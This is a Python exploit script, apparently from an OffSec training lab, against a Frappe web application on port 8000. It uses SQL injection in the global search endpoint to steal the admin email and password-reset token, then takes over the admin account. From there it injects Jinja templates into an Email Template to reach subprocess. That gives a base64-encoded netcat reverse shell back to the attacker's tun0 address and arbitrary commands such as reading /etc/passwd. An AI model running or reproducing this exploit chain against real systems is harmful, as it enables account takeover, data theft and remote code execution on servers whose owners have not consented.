import sys, re, os
import requests
import subprocess
import base64
import json
from datetime import datetime, timedelta
requests.packages.urllib3.disable_warnings()
from secrets import token_hex

def send_sql_comamnd(ip, command):
	target = f"http://{ip}:8000"
	data = {
		"cmd": "frappe.utils.global_search.web_search",
		"text": "offsec",
		"scope": command
	}
	r = requests.post(target, data=data)
	resp = json.loads(r.text)
	if "message" not in resp:
		print("HTML request unsuccessful")
		exit(0)
	return resp["message"]

def get_admin_user_email(ip):
	command = "test_scope\" UNION ALL SELECT 1,2,3,4,name COLLATE utf8mb4_general_ci FROM __Auth#"

	output = send_sql_comamnd(ip, command)
	output = [i['route'] for i in output] # Filter to only last term 
	output = [i for i in output if ".com" in i] # Filter for email addresses

	if len(output) == 0:
		print("No valid users found")
		exit(0)

	if len(output) > 1:
		print(f"Multiple valid users found, using {output[0]}")

	admin_email = output[0]

	return admin_email

def send_reset_password(ip, admin_email):
	target = f"http://{ip}:8000"
	data = {
		"cmd": "frappe.core.doctype.user.user.reset_password",
		"user": admin_email
	}
	r = requests.post(target, data=data)
	if "Password reset instructions" not in r.text:
		print("Password reset unsuccessful")
		exit(0)

	print("Password reset successful")

def get_password_reset_token(ip, admin_email):
	command = f"test_scope\" UNION ALL SELECT 1,2,3,4,reset_password_key COLLATE utf8mb4_general_ci FROM tabUser WHERE name = \"{admin_email}\"#"

	output = send_sql_comamnd(ip, command)
	if len(output) != 1:
		print("Token not found")
		exit(0)

	token = output[0]['route']
	return token

def reset_password(ip, admin_email, token, new_password):
	s = requests.Session()

	# proxies = {
	# 	'http': 'http://127.0.0.1:8080',
	# 	'https': 'http://127.0.0.1:8080'
	# }
	# s.proxies.update(proxies)

	target = f"http://{ip}:8000"
	data = {
		"key": token,
		"old_password": "",
		"new_password": new_password,
		"cmd": "frappe.core.doctype.user.user.update_password"
	}

	r = s.post(target,data=data)

	if "/desk" in r.text:
		print("Password reset successful!")
		print(f"New password: {new_password}")
		return

	print("Password reset unsuccessful")
	exit(0)

def login(ip, admin_email, password):
	s = requests.Session() # Send request with session to keep persistent session variable

	target = f"http://{ip}:8000"
	data = {
		"cmd": "login",
		"usr": admin_email,
		"pwd": password
	}

	headers = {
		'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0',
		'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8'
	}
	s.headers.update(headers)

	proxies = {
		'http': 'http://127.0.0.1:8080',
		'https': 'http://127.0.0.1:8080'
	}
	s.proxies.update(proxies)

	r = s.post(target, data=data)

	if "Logged In" in r.text:
		print("Successful login!")
		return s
	
	print("Login failed")
	exit(0)

def create_email_template(ip, session, admin_email, template):
	curtime = (datetime.utcnow() - timedelta(hours = 4)).strftime("%Y-%m-%d %H:%M:%S.%f")
	print("Current time: ", curtime)
	records = [{
		"user":admin_email,
		"creation": curtime,
		"route":"List/Email Template/List"
	}]

	data = {
		"doctype":"Route History",
		"records": json.dumps(records)
	}

	target = f"http://{ip}:8000/api/method/frappe.deferred_insert.deferred_insert"

	r = session.post(target, data=data)
	
	template_name = token_hex(4)

	doc = {
		"docstatus":0,
		"doctype":"Email Template",
		"name":"New Email Template 2",
		"__islocal":1,
		"__unsaved":1,
		"owner":admin_email,
		"__newname":template_name,
		"subject":"Pwned!",
		"response":"<div>" + template + "</div>"
	}

	target = f"http://{ip}:8000/api/method/frappe.desk.form.save.savedocs"

	data = {
		"doc": json.dumps(doc),
		"action": "Save"
	}

	r = session.post(target, data=data)

	return template_name

def update_template(ip, session, admin_email, template_name, template):
	# Start by getting template information
	target = f"http://{ip}:8000/api/method/frappe.desk.form.load.getdoc?doctype=Email+Template&name={template_name}"

	r = session.get(target)
	template_info = json.loads(r.text)

	# with open("template_info.json", "w") as f:
	# 	f.write(json.dumps(template_info))

	creation_time = template_info["docs"][0]["creation"]
	modified_time = template_info["docs"][0]["modified"]

	doc = {
		"modified":modified_time,
		"owner":admin_email,
		"modified_by":admin_email,
		"docstatus":0,
		"idx":0,
		"response":f"<div>{template}</div>",
		"doctype":"Email Template",
		"creation":creation_time,
		"name":template_name,
		"subject":"Pwned!"
	}

	target = f"http://{ip}:8000/api/method/frappe.desk.form.save.savedocs"

	data = {
		"doc": json.dumps(doc),
		"action": "Save"
	}

	r = session.post(target, data=data)

def get_output(ip, session, admin_email, template_name, template):
	print("")
	print("Executing template " + template)

	# Update Template
	update_template(ip, session, admin_email, template_name, template)

	# Start by getting template information
	target = f"http://{ip}:8000/api/method/frappe.desk.form.load.getdoc?doctype=Email+Template&name={template_name}"

	r = session.get(target)
	template_info = json.loads(r.text)

	creation_time = template_info["docs"][0]["creation"]
	modified_time = template_info["docs"][0]["modified"]

	doc = {
		"modified":modified_time,
		"owner":admin_email,
		"modified_by":admin_email,
		"docstatus":0,
		"idx":0,
		"response":f"<div>{template}</div>",
		"doctype":"Email Template",
		"creation":creation_time,
		"name":template_name,
		"subject":"Pwned!"
	}

	target = f"http://{ip}:8000/api/method/frappe.email.doctype.email_template.email_template.get_email_template"

	data = {
		"template_name": template_name,
		"doc": json.dumps(doc),
		"action": "Save"
	}

	r = session.post(target, data=data)
	
	return r.text

# Generates base64 nc reverse shell payload
def generate_shellcode(LHOST, LPORT):
	command = f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc {LHOST} {LPORT} >/tmp/f"
	encoded = base64.b64encode(command.encode())
	encoded = encoded.decode()

	return encoded

def get_shell(ip, session, admin_email, template_name):

	LHOST = os.popen('ip addr show tun0').read().split("inet ")[1].split("/")[0]
	LPORT = 9001
	shellcode = generate_shellcode(LHOST, LPORT)	

	template = ("{% set string = \"test\" %}"
	"{% set class_template = \"\\x5f\\x5fclass\\x5f\\x5f\" %}"
	"{% set mro_template = \"\\x5f\\x5fmro\\x5f\\x5f\" %}"
	"{% set subclasses_template = \"\\x5f\\x5fsubclasses\\x5f\\x5f\" %}"
	"{% set mro = string|attr(class_template)|attr(mro_template) %}"
	"{% set subclasses = mro[1]|attr(subclasses_template)() %}"
	"{{subclasses}}")

	output = get_output(ip, session, admin_email, template_name, template)
	resp = json.loads(output)["message"]["message"]
	resp = resp[5:-6] # Remove <div></div> tag

	# Match away <class XXX > tags
	subclasses = re.findall('<class \'(.*?)\'>,', output)
	popen_index = subclasses.index('subprocess.Popen')
	print("Subclass index: ", popen_index)
	
	template = ("{% set string = \"test\" %}"
	"{% set class_template = \"\\x5f\\x5fclass\\x5f\\x5f\" %}"
	"{% set mro_template = \"\\x5f\\x5fmro\\x5f\\x5f\" %}"
	"{% set subclasses_template = \"\\x5f\\x5fsubclasses\\x5f\\x5f\" %}"
	"{% set mro = string|attr(class_template)|attr(mro_template) %}"
	"{% set subclasses = mro[1]|attr(subclasses_template)() %}"
	f"{{% set subprocess = subclasses[{popen_index}] %}}"
	f"{{% set shellcode = \"echo {shellcode} = | base64 -d  | sh\" %}}"
	"{{subprocess(shellcode, shell=True)}}")

	output = get_output(ip, session, admin_email, template_name, template)
	print(output)

# Extra Mile 8.6.2.2
def execute_command(ip, session, admin_email, template_name, command):
	template = (
	"{% set init_template = \"__init__\" %}"
	"{% set global_template = \"__globals__\" %}"
	"{% set attr = self|attr(init_template)|attr(global_template) %}"
	"{% set sys = attr.sys %}"
	"{% set modules = sys|attr(\"modules\") %}"
	"{% set subprocess = modules.subprocess %}"
	f"{{{{subprocess.run(\"{command}\", shell=True, stdout=subprocess.PIPE).stdout}}}}"
	)
	print()
	print(f"Executing command: {command}")

	output = get_output(ip, session, admin_email, template_name, template)
	try:
		return json.loads(output)["message"]["message"][5:-6]
	except Exception as e:
		print(e)
		print("RCE has failed")
		exit(0)

# Extra Mile 8.6.2.2
def run_command_2(ip, session, admin_email, template_name, command):
	template = ("{% set string = \"test\" %}"
	"{% set class_template = \"\\x5f\\x5fclass\\x5f\\x5f\" %}"
	"{% set mro_template = \"\\x5f\\x5fmro\\x5f\\x5f\" %}"
	"{% set subclasses_template = \"\\x5f\\x5fsubclasses\\x5f\\x5f\" %}"
	"{% set mro = string|attr(class_template)|attr(mro_template) %}"
	"{% set subclasses = mro[1]|attr(subclasses_template)() %}"
	"{{subclasses}}"
	)

	print()
	print(f"Run command: {command}")
	
	output = get_output(ip, session, admin_email, template_name, template)
	resp = json.loads(output)["message"]["message"]
	resp = resp[5:-6] # Remove <div></div> tag

	# Match away <class XXX > tags
	subclasses = re.findall('<class \'(.*?)\'>,', output)
	builtin_index = subclasses.index("_frozen_importlib.BuiltinImporter")
	print("Subclass index: ", builtin_index)
	
	template = ("{% set string = \"test\" %}"
	"{% set class_template = \"\\x5f\\x5fclass\\x5f\\x5f\" %}"
	"{% set mro_template = \"\\x5f\\x5fmro\\x5f\\x5f\" %}"
	"{% set subclasses_template = \"\\x5f\\x5fsubclasses\\x5f\\x5f\" %}"
	"{% set mro = string|attr(class_template)|attr(mro_template) %}"
	"{% set subclasses = mro[1]|attr(subclasses_template)() %}"
	f"{{% set builtins = subclasses[{builtin_index}]%}}"
	"{% set subprocess = builtins|attr(\"load_module\")(\"subprocess\") %}"
	f"{{{{subprocess.run(\"{command}\", shell=True, stdout=subprocess.PIPE).stdout}}}}"
	)

	output = get_output(ip, session, admin_email, template_name, template)
	print(output)

	return ""
	try:
		return json.loads(output)["message"]["message"][5:-6]
	except Exception as e:
		print(e)
		print("RCE has failed")
		exit(0)


def main():
	if len(sys.argv) != 2:
		print ("(+) usage: %s <target>" % sys.argv[0])
		print ('(+) eg: %s 192.168.121.103'  % sys.argv[0])
		sys.exit(-1)

	ip = sys.argv[1]
	LHOST = os.popen('ip addr show tun0').read().split("inet ")[1].split("/")[0]
	LPORT = 9001
	new_password = "PwnedPassword!"

	admin_email = get_admin_user_email(ip)
	print(f"Admin email {admin_email} found!")

	print("Sending password reset......")
	send_reset_password(ip, admin_email)

	print("Searching for password reset token")
	token = get_password_reset_token(ip, admin_email)
	print(f"Sucessfully got reset token {token}")

	print("Restting password")
	reset_password(ip, admin_email, token, new_password)
	print("Password reset succesfully!")

	print("Logging in now")
	session = login(ip, admin_email, new_password)

	template_name = create_email_template(ip, session, admin_email, "baseline")
	print(f"Created new template named: {template_name}")

	# Gets a reverse shell on port 9001
	print("Sending reverse shell, ensure you have netcat listener on port 9001")
	get_shell(ip, session, admin_email, template_name)
	
	# Runs arbitrary command (using sys intermediary)
	cmd = "cat /etc/passwd"
	output = execute_command(ip, session, admin_email, template_name, cmd)
	print(output)

	# Arbitrary file run (using builtin functions)
	cmd = "whoami"
	output = run_command_2(ip, session, admin_email, template_name, cmd)
	print(output)

if __name__ == '__main__':
	main()